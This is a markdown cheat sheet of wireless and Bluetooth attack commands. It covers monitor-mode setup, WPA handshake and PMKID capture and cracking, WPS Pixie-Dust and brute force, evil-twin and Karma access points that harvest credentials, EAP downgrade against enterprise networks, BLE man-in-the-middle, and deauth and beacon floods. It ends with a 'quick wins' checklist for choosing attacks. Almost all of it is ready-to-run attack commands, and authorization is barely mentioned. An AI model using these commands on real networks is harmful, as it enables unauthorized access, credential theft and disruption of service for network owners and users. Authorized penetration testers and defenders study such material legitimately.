# Wireless Network Security Testing

## Interface Setup
```bash
iwconfig
airmon-ng check kill
airmon-ng start wlan0
# Verify monitor mode
iwconfig wlan0mon
# Set specific channel
iwconfig wlan0mon channel 6
# Increase TX power (if regulatory allows)
iw reg set BO && iwconfig wlan0mon txpower 30
```

## Reconnaissance
```bash
# Scan all channels
airodump-ng wlan0mon
# Target specific channel/BSSID
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Identify hidden SSIDs — wait for probe responses or deauth a client
airodump-ng wlan0mon | grep "<length:"
aireplay-ng -0 3 -a <BSSID> wlan0mon  # deauth to reveal hidden SSID
# Client probes reveal preferred networks
airodump-ng wlan0mon --output-format csv -w probes
```

## WPA/WPA2 PSK Cracking

### 4-Way Handshake Capture
```bash
# Start capture on target channel
airodump-ng -c <CH> --bssid <BSSID> -w handshake wlan0mon
# Deauth connected client to force reconnect
aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
# Verify handshake captured (top-right of airodump shows "WPA handshake")
aircrack-ng handshake-01.cap
```

### PMKID Attack (Clientless)
```bash
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 --filterlist_ap=<BSSID> --filtermode=2
hcxpcapngtool pmkid.pcapng -o hash.22000
hashcat -m 22000 hash.22000 rockyou.txt
# Alternative: hcxtools
hcxdumptool -i wlan0mon --rds=1 -o dump.pcapng
hcxpcapngtool dump.pcapng -o hashes.22000
```

### Cracking
```bash
# hashcat (GPU, fast)
hashcat -m 22000 hash.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# aircrack-ng (CPU)
aircrack-ng -w rockyou.txt handshake-01.cap
# cowpatty (precomputed PMK tables)
genpmk -f rockyou.txt -d pmk_table -s "TargetSSID"
cowpatty -d pmk_table -r handshake-01.cap -s "TargetSSID"
```

## WPS Attacks
```bash
# Scan for WPS-enabled APs
wash -i wlan0mon
# Reaver brute force
reaver -i wlan0mon -b <BSSID> -c <CH> -vv -K 1 -N
# Bully (alternative)
bully wlan0mon -b <BSSID> -c <CH> -S -F -B -v 3
# Pixie-Dust (offline WPS PIN recovery)
reaver -i wlan0mon -b <BSSID> -c <CH> -K 1 -vv
# OneShot (automated pixie-dust)
python3 oneshot.py -i wlan0mon -b <BSSID> -K
```

## Evil Twin / Rogue AP
```bash
# hostapd-mana (credential harvesting AP)
cat > /tmp/mana.conf << 'EOF'
interface=wlan0
ssid=TargetNetwork
channel=6
hw_mode=g
ieee80211n=1
wpa=2
wpa_passphrase=doesntmatter
mana_wpaout=/tmp/mana_creds.hccapx
EOF
hostapd-mana /tmp/mana.conf

# wifiphisher (automated evil twin + captive portal)
wifiphisher -aI wlan0mon -eI wlan1 -p firmware-upgrade --essid "TargetNetwork"

# Manual evil twin with dnsmasq + captive portal
airbase-ng -e "Free_WiFi" -c 6 wlan0mon
ifconfig at0 10.0.0.1 netmask 255.255.255.0 up
dnsmasq -C /tmp/dnsmasq.conf --interface=at0
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

## WPA Enterprise Attacks
```bash
# EAP downgrade — force client to use GTC/PAP (sends cleartext creds)
# hostapd-mana with EAP config:
mana_eap_type=GTC
mana_credout=/tmp/enterprise_creds.txt
# freeradius-wpe (captures MSCHAPv2 challenge/response)
radiusd -X  # run modified FreeRADIUS
# Crack captured MSCHAPv2
asleap -C <challenge> -R <response> -W rockyou.txt
hashcat -m 5500 netntlmv1.txt rockyou.txt
```

## Bluetooth Attacks
```bash
# Discovery
hcitool scan
hcitool inq
# Service enumeration
sdptool browse <BD_ADDR>
# BLE scanning
hcitool lescan
# BLE GATT enumeration
gatttool -b <BD_ADDR> -I
> primary
> characteristics
# btlejuice MITM for BLE
btlejuice-proxy -i hci0 -u <BD_ADDR>
btlejuice -w  # web UI on port 8080
# Bluetooth PIN brute force
btcrack <BD_ADDR>
```

## Deauth and DoS
```bash
# Targeted deauth
aireplay-ng -0 0 -a <BSSID> -c <CLIENT_MAC> wlan0mon
# Broadcast deauth (all clients)
aireplay-ng -0 0 -a <BSSID> wlan0mon
# mdk4 beacon flood
mdk4 wlan0mon b -f ssid_list.txt -s 1000
# mdk4 authentication flood
mdk4 wlan0mon a -a <BSSID> -s 1000
# mdk4 deauth flood
mdk4 wlan0mon d -B targets.txt
```

## Karma / Known-Beacons Attack
```bash
# Respond to all client probes — impersonate any requested SSID
hostapd-mana /tmp/karma.conf  # with mana_open=1, enable_mana=1
# Combine with MITM: route traffic through attacker, capture creds
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward
```

## Quick Wins Checklist
1. WPS enabled with no lockout → Pixie-Dust attack for instant PSK recovery
2. Weak WPA2 PSK (dictionary word) → capture handshake + hashcat
3. PMKID grab requires zero clients — try this first on every WPA2 target
4. WPA Enterprise with EAP-PEAP/MSCHAPv2 — evil twin + credential capture
5. Hidden SSID = false security — one deauth reveals it
6. Open networks in corporate environments → Karma attack + credential sniffing
7. Bluetooth devices in discoverable mode → service enumeration for known vulns
